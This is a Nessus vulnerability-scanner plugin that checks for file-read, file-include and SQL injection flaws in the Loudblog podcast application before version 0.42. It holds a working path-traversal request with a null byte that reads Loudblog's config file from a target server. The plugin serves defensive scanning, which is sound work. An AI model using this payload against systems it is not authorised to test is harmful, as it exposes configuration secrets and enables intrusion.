#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that suffers from
multiple vulnerabilities. 

Description :

The remote host is running Loudblog, a PHP application for publishing
podcasts and similar media files. 

The version of Loudblog installed on the remote host fails to sanitize
input to the 'template' parameter of the 'index.php' script before
returning the contents of the file in a dynamic web page.  An
unauthenticated attacker can exploit this issue to view arbitrary
files on the affected system subject to the privileges of the web
server user id. 

In addition, there reportedly is also a local file include flaw
involving the 'language' and 'page' parameters of the
'inc/backend_settings.php'and 'index.php' scripts and a SQL injection
flaw involving the 'id' parameter of the 'podcast.php' script. 

Successful exploitation of these issues reportedly requires that PHP's
'magic_quotes_gpc' be disabled. 

See also :

http://www.securityfocus.com/archive/1/426973/30/0/threaded
http://loudblog.de/forum/viewtopic.php?id=592

Solution :

Upgrade to Loudblog 0.42 or later. 

Risk factor : 

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";


if (description) {
  script_id(21024);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-1113", "CVE-2006-1114");
  script_bugtraq_id(17023);

  script_name(english:"Loudblog < 0.42 Multiple Vulnerabilities");
  script_summary(english:"Tries to read Loudblog's config file");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/loudblog", "/podcast", "/podcasts", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab config.php.
  file = "../../../loudblog/custom/config.php";
  req = http_get(
    item:string(
      dir, "/index.php?",
      "template=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like Loudblog and...
    "Loudblog built this page" >< res &&
    # it looks like the config file.
    "$lb_path" >< res
  ) {
    content = res - strstr(res, "<!-- Loudblog built this page");
    if (isnull(content)) content = res;

    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of Loudblog's config file that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      content
    );

    security_warning(port:port, data:report);
    exit(0);
  }
}
